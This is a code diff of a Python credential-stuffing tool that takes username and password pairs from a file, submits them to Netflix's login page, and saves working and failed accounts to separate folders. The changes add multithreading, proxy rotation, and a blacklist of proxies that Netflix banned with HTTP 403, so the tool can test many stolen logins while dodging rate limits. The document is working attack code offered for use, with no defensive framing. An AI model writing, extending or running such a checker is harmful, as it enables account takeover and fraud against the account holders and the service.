@@ -2,18 +2,16 @@ from colorama import Fore
 from enum import Enum
 from io import TextIOWrapper
 from datetime import datetime
+from mechanize import HTTPError
 
 import math
 import os
 import mechanize
-import json
-import requests
-import time
 import random
 import threading
 import multiprocessing
-import urllib3, socket
 import sys
+import schedule
 
 ## ------------------------ Data folders -------------------------------
 MALFORMED_ACCOUNTS_FOLDER = "malformed_accounts"
@@ -22,10 +20,15 @@ WORKING_ACCOUNTS_FOLDER = "working_accounts"
 NOTWORKING_ACCOUNTS_FOLDER = "notworking_accounts"
 ## ---------------------------------------------------------------------
 
-GOAL_THREADS_NUMBER = 8
+## ------------------------ Conventions --------------------------------
+GOAL_THREADS_NUMBER = 10
 COMMON_FILE_CONVENTION = ".txt"
 COMMON_ACCOUNT_NAME  = "accounts" + COMMON_FILE_CONVENTION
 COMMON_PROXIES_NAME = "proxies" + COMMON_FILE_CONVENTION
+## ---------------------------------------------------------------------
+
+LAST_USED_PROXIES: list[str] = []
+DIE_PROXIES: list[str] = []
 
 class AccountState(Enum):
     LIVE = "LIVE",
@@ -37,7 +40,6 @@ class FileType(Enum):
 
 def print_error(message: str) -> None:
     print(Fore.RED, message)
-
 
 def welcome() -> None:
     message: str = '''
@@ -51,7 +53,6 @@ def welcome() -> None:
     print(Fore.GREEN , message)
     print(Fore.BLUE , "   starting")
     print(Fore.BLUE, "   ========================================================")
-
 
 def load_file_as_tuple(file_type: FileType, file_name: str | None) -> list[tuple]:
     global COMMON_FILE_CONVENTION
@@ -115,10 +116,31 @@ def load_file(file_name: str) -> TextIOWrapper:
         print_error("Error trying to open accounts file")
         sys.exit()
 
-def generate_request_proxy(proxies: list[tuple]) -> dict:
-    choosen_proxy = random.choice(proxies)
+def check_available_proxie_in_queue(proxy: str) -> bool:
+    global LAST_USED_PROXIES
+    if proxy in LAST_USED_PROXIES: return False
+    return True
+    
+def purge_last_used_proxes() -> None:
+    global LAST_USED_PROXIES
+    if len(LAST_USED_PROXIES) > 0: LAST_USED_PROXIES.clear()
+
+def build_proxy_address(proxy: tuple) -> str:
+    return f'http://{proxy[0]}:{proxy[1]}'
+
+def generate_request_proxy(proxies: list[tuple]) -> dict | None:
+    global DIE_PROXIES
+    available_proxies = [proxy for proxy in proxies if proxy not in DIE_PROXIES]
+    choosen_proxy = random.choice(available_proxies)
+    if len(proxies) == len(DIE_PROXIES): return None
+    build_proxy = build_proxy_address(choosen_proxy)
+    available_proxies = [proxy for proxy in available_proxies if check_available_proxie_in_queue(proxy=build_proxy)]
+
+    choosen_proxy = random.choice(available_proxies)
+    build_proxy = build_proxy_address(choosen_proxy)
+
     return {
-        "http": f'http://{choosen_proxy[0]}:{choosen_proxy[1]}'
+        "http": build_proxy
     }
 
 def chek_available_cores() -> int:
@@ -142,8 +164,8 @@ def check_available_threads(available_cores: int) -> int:
     print(Fore.YELLOW, f'   Available threads {available_threads}')
     return available_threads
 
-
-def check_account(account: tuple, proxy: dict) -> bool:
+def check_account(account: tuple, proxy: dict) -> None:
+    global LAST_USED_PROXIES
     br = mechanize.Browser()
     br.set_handle_equiv(True)
     br.set_handle_redirect(True)
@@ -152,35 +174,59 @@ def check_account(account: tuple, proxy: dict) -> bool:
     br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'), ('Content-Type','application/json')]
     br.set_proxies(proxies=proxy)
 
-    br.open('https://www.netflix.com/co-en/login')
-    br.select_form(nr=0)
-    br.form["userLoginId"] = account[0]
-    br.form["password"] = account[1]
+    try:
+        br.open('https://www.netflix.com/co-en/login')
+        br.select_form(nr=0)
+        br.form["userLoginId"] = account[0]
+        br.form["password"] = account[1]
     
-    print(Fore.WHITE, "   ========================================================")
-    print(Fore.GREEN,f'   Testing account {account}')
+        print(Fore.WHITE, "   ========================================================")
+        print(Fore.GREEN,f'   Testing account {account}')
     
-    response = br.submit()
-    if response.geturl() == "https://www.netflix.com/browse":
-        print(Fore.YELLOW, f'   Account working: {account}')
-        save_account(data=account, accounts_state=AccountState.LIVE)
-        time.sleep(2)
-        return True
-    else:
-        print(Fore.RED, f'   Account die: {account}')
-        save_account(data=account, accounts_state=AccountState.DIE)
-        time.sleep(2)
-        return False
+        response = br.submit()
+        if response.geturl() == "https://www.netflix.com/browse":
+            print(Fore.YELLOW, f'   Account working: {account}')
+            save_account(data=account, accounts_state=AccountState.LIVE)
+        else:
+            print(Fore.RED, f'   Account die: {account}')
+            save_account(data=account, accounts_state=AccountState.DIE)
+        #LAST_USED_PROXIES.append(proxy["http"])
+    except HTTPError as e:
+        global DIE_PROXIES
+        if e.code == 403:
+            DIE_PROXIES.append(proxy["http"])
+            print(Fore.GREEN, "Netflix ban")
+    except Exception:
+        print_error(f'   Cheking error: {Exception}')
 
 def check_accounts(accounts: list[tuple], proxies: list[tuple]) -> None:
-    #available_cores: int = chek_available_cores()
-    purgued_accounts = accounts.copy() 
-    #available_threads = check_available_threads(available_cores=available_cores)
-    for account in purgued_accounts:
-        proxy = generate_request_proxy(proxies=proxies)
-        check_account(account=account, proxy=proxy)
-    print(Fore.WHITE, "   ========================================================")
-        
+    available_cores: int = chek_available_cores()
+    purgued_accounts: list[tuple] = accounts.copy() 
+    available_threads = check_available_threads(available_cores=available_cores)
+    init_schedule(purge_last_used_proxes, 2)
+    try:
+        while available_threads != 0:
+            active_threads: list = []
+            for i in range(0, available_threads -1):
+                proxy = generate_request_proxy(proxies=proxies)
+                if(proxy == None):
+                    raise ValueError("Non available proxies")
+                #check_account(account=purgued_accounts[i], proxy=proxy)
+                thread = threading.Thread(target=check_account, args=(purgued_accounts[i], proxy))
+                thread.start()
+                active_threads.append(thread)
+            for thread in active_threads:
+                thread.join()
+            purgued_accounts = purgued_accounts[available_threads:]   
+            available_threads = check_available_threads(available_cores=available_cores)
+    except ValueError:
+        print_error("   All proxies die: ")
+    except Exception as e:
+        print_error(f'   Error: {e}')
+
+def init_schedule(function, time: int) -> None:
+    schedule.every(time).seconds.do(function)
+
 def setup() -> None:
     global MALFORMED_ACCOUNTS_FOLDER
     global MALFORMED_PROXIES_FOLDER
@@ -192,7 +238,6 @@ def setup() -> None:
     if not os.path.exists(f'./{NOTWORKING_ACCOUNTS_FOLDER}'): os.makedirs(NOTWORKING_ACCOUNTS_FOLDER)
     if not os.path.exists(f'./{WORKING_ACCOUNTS_FOLDER}'): os.makedirs(WORKING_ACCOUNTS_FOLDER)
     print(Fore.GREEN, "    Setup done ===========================> \n")
-
 
 def start() -> None:
     welcome()
